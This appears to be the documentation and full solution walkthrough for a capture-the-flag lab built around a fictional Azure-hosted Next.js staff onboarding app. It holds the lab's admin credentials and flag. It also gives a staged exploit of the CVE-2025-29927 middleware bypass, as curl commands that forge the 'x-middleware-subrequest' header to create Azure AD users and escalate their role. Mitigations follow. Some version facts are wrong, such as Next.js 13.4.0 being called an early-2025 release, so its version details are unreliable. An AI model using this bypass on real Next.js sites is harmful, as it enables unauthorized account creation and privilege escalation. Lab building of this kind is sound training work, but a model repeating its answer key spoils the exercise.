# Technical Documentation: MediCloudX Workforce Onboarding System

## System Architecture Overview

The MediCloudX Workforce Onboarding system is deployed on Azure using modern cloud-native technologies:

### Infrastructure Components

1. **Azure Resource Group**: `medicloudx-identity-<suffix>`
2. **Azure Container Registry**: Private registry for application images
3. **App Service Plan**: Linux-based container hosting (B1 SKU)
4. **Azure Web App**: Next.js application with system-assigned managed identity
5. **Azure Active Directory**: App registration with Microsoft Graph API permissions
6. **Azure Key Vault**: Secure storage for application secrets

### Application Stack

- **Framework**: Next.js 13.4.0 (React-based web framework)
- **Runtime**: Node.js 18 Alpine Linux container
- **Authentication**: Cookie-based session management
- **API Integration**: Microsoft Graph API for Azure AD operations

## API Endpoints

### Primary Application Routes

- `GET /` - Main dashboard (requires authentication)
- `GET /login` - Authentication page
- `POST /api/create-user` - User creation endpoint (protected)
- `POST /api/update-departament` - User department update endpoint (protected)
- `GET /api/version` - System version information
- `GET /docs` - API documentation endpoint
- `GET /support` - Support Hub landing page
- `POST /api/validate/support` - Support department validation endpoint

### Authentication Flow

1. User accesses the application at the root URL
2. Middleware checks for `auth-token` cookie
3. If no token present, user is redirected to `/login`
4. Valid credentials: `hradmin` / `MediCloudX2025!`
5. Upon successful login, auth cookie is set with 1-hour expiration

## Microsoft Graph API Integration

### Permissions Granted

The application has the following Microsoft Graph API permissions:

**Application Permissions (Admin Consent Required):**
- `User.ReadWrite.All` - Create, read, update users
- `Group.ReadWrite.All` - Manage group memberships  
- `Directory.ReadWrite.All` - Directory-wide operations

**Managed Identity Permissions:**
- `User.ReadWrite.All` - Assigned to App Service managed identity

### User Creation Process

When a user creation request is made to `/api/create-user`, the application:

1. Generates a random 5-character user identifier
2. Creates a secure temporary password (16 characters)
3. Constructs user data object with Azure AD fields
4. Returns user information including temporary credentials

### Support Hub Integration

The application includes a **Support Hub** feature accessible at `/support` that demonstrates privilege escalation scenarios:

**OAuth Integration**:
1. Microsoft OAuth 2.0 authentication flow
2. Azure AD integration for user identity verification
3. Department-based access control

**Privilege Validation Process**:
1. User completes OAuth authentication
2. Application validates user's department via Microsoft Graph API
3. Only users with department="Support" gain access to restricted content
4. Flag is revealed upon successful validation: `CLD[b7d9f3e2-4a8c-4f1e-9b6d-2e5a8c7f3b9d]`

**Technical Implementation**:
- `/support/login` - Initiates Microsoft OAuth flow
- `/support/callback` - Handles OAuth response and redirects to dashboard
- `/support/dashboard` - Interactive interface with validation button
- `/api/validate/support` - Backend validation endpoint using application credentials

## Security Implementation

### Middleware Configuration

The application uses Next.js middleware (`src/middleware.js`) to:
- Skip authentication for static resources and public pages
- Protect sensitive API endpoints
- Redirect unauthenticated users to login page

### Authentication Validation

Protected routes check for the presence of an `auth-token` cookie before allowing access to restricted functionality.

## Technical Analysis Points

### Framework Version Information

- **Next.js Version**: 13.4.0
- **Release Timeline**: This version was released in early 2025
- **Security Considerations**: Version predates certain security patches

### HTTP Header Processing

The middleware implementation processes incoming HTTP requests and examines various headers and cookies for authentication decisions.

### Request Interception

Next.js middleware operates at the edge, intercepting requests before they reach API routes or pages, allowing for request manipulation and routing decisions.

## Vulnerability Analysis: CVE-2025-29927

### Next.js Middleware Authorization Bypass

This application demonstrates **CVE-2025-29927**, a critical vulnerability in Next.js middleware that allows authorization bypass through manipulation of internal HTTP headers.

### Technical Details

**Vulnerability**: Next.js versions 13.4.0 - 15.2.1 contain a flaw where the framework improperly handles the internal `x-middleware-subrequest` header, allowing attackers to bypass middleware protection entirely.

**Root Cause**: Next.js uses the `x-middleware-subrequest` header internally to track middleware recursion depth and prevent infinite loops. When this header is present with specific values, Next.js assumes the request is a legitimate internal subrequest and skips middleware execution.

### Exploitation Method

**Vulnerable Endpoint**: `POST /api/create-user`

**Normal Behavior**: 
- Request without proper authentication → `307 Temporary Redirect` to `/login`
- Middleware executes and enforces authentication checks

**Exploitation**:
The vulnerability can be exploited using the following HTTP request:

```http
POST /api/create-user HTTP/1.1
Host: medicloudx-onboarding-ctr9lkls.azurewebsites.net
Content-Type: application/json
x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware

{}
```

**Critical Header**: `x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware`

**Key Points**:
- The header value must match the middleware file path (`src/middleware` for `/src/middleware.js`)
- Five repetitions separated by colons trigger the `MAX_RECURSION_DEPTH` condition
- This bypasses middleware completely, allowing direct access to protected API endpoints

### Attack Impact

**Successful exploitation results in**:
1. **Complete authentication bypass** - No credentials required
2. **Direct API access** - Circumvents all middleware protections  
3. **User creation capabilities** - Can create real Azure AD users
4. **Privilege escalation** - Gains administrative functions without authorization

## Complete Attack Flow: Multi-Stage Privilege Escalation

### Stage 1: Reconnaissance and Discovery

1. **Directory Enumeration**: Discover the `/docs` endpoint
   ```bash
   curl -X GET https://medicloudx-onboarding-ctr9lkls.azurewebsites.net/docs
   ```

2. **API Documentation Analysis**: The `/docs` endpoint reveals critical information:
   - Available API endpoints and their methods
   - Request body structures for protected APIs
   - Authentication requirements for each endpoint

   **Key discoveries from `/docs`**:
   - `POST /api/create-user` - User creation (empty body: `{}`)
   - `POST /api/update-departament` - Department assignment (requires: `{"id": "", "departament": ""}`)
   - `GET /api/version` - System information

### Stage 2: Authentication Bypass

3. **Test normal behavior** (should redirect):
   ```bash
   curl -X POST https://medicloudx-onboarding-ctr9lkls.azurewebsites.net/api/create-user \
     -H "Content-Type: application/json" \
     -d "{}" -v
   ```

4. **Exploit CVE-2025-29927** (should succeed):
   ```bash
   curl -X POST https://medicloudx-onboarding-ctr9lkls.azurewebsites.net/api/create-user \
     -H "Content-Type: application/json" \
     -H "x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware" \
     -d "{}" -v
   ```

5. **Extract User Information**: From the successful response, capture the created user's ID for the next stage.

### Stage 3: Privilege Escalation

6. **Department Assignment Exploitation**: Use the discovered API structure to elevate privileges
   ```bash
   curl -X POST https://medicloudx-onboarding-ctr9lkls.azurewebsites.net/api/update-departament \
     -H "Content-Type: application/json" \
     -H "x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware" \
     -d '{"id": "USER_ID_FROM_STAGE_2", "departament": "Support"}' -v
   ```

### Stage 4: Access Restricted Resources

7. **Support Hub Access**: Navigate to the Support Hub using created credentials
   - Access: `https://medicloudx-onboarding-ctr9lkls.azurewebsites.net/support`
   - Authenticate with Microsoft OAuth using the created user account
   - Click "Access Restricted Content" button

8. **Flag Capture**: The validation endpoint confirms Support department access and reveals the flag:
   ```
   CLD[b7d9f3e2-4a8c-4f1e-9b6d-2e5a8c7f3b9d]
   ```

### Attack Impact Summary

**Complete compromise achieved through**:
1. **Information Disclosure** - `/docs` reveals API structure
2. **Authentication Bypass** - CVE-2025-29927 circumvents all protections
3. **Privilege Escalation** - Department assignment to "Support" role
4. **Unauthorized Access** - Full access to restricted Support Hub resources

### Verification Steps

### Mitigation Strategies

**Immediate Actions**:
- **Framework Update**: Upgrade to Next.js 15.3.0+ where CVE-2025-29927 has been patched
- **WAF Implementation**: Block requests containing `x-middleware-subrequest` header at the web application firewall level
- **Endpoint Security**: Remove or secure the `/docs` endpoint to prevent information disclosure

**Long-term Security**:
- **Code Review**: Implement additional authorization checks within API route handlers
- **Defense in Depth**: Never rely solely on middleware for security-critical operations
- **API Security**: Implement proper OAuth scopes and permission validation for sensitive endpoints
- **Monitoring**: Add detection rules for unusual API usage patterns and privilege escalation attempts

## Deployment Configuration

### Container Configuration

```dockerfile
FROM node:18-alpine AS base
# Multi-stage build process
# Production optimizations applied
# Runs as non-root user (nextjs:nodejs)
```

### Azure App Service Settings

- **Runtime Stack**: Node.js 18 LTS
- **Container Port**: 3000
- **Authentication**: Disabled at App Service level
- **Managed Identity**: System-assigned, integrated with Key Vault

## Development and Testing

### Local Testing Commands

```bash
# Install dependencies
npm ci --only=production

# Build application
npm run build

# Start production server
npm start
```

### Docker Operations

```bash
# Build container image
docker build -t medicloudx-onboarding .

# Run container locally
docker run -p 3000:3000 medicloudx-onboarding
```

## Monitoring and Logging

- Application logs are captured by Azure App Service
- Authentication events are logged for audit purposes
- Microsoft Graph API calls are tracked through Azure AD logs
- Container health monitoring enabled

## Compliance and Security Notes

- Healthcare data handling compliance (HIPAA considerations)
- Azure AD integration for enterprise identity management
- Key Vault integration for secure credential storage
- Role-based access control implementation
- Audit logging for user creation activities

---

*This documentation provides technical implementation details for the MediCloudX Workforce Onboarding system. For operational procedures, refer to the main README documentation.*
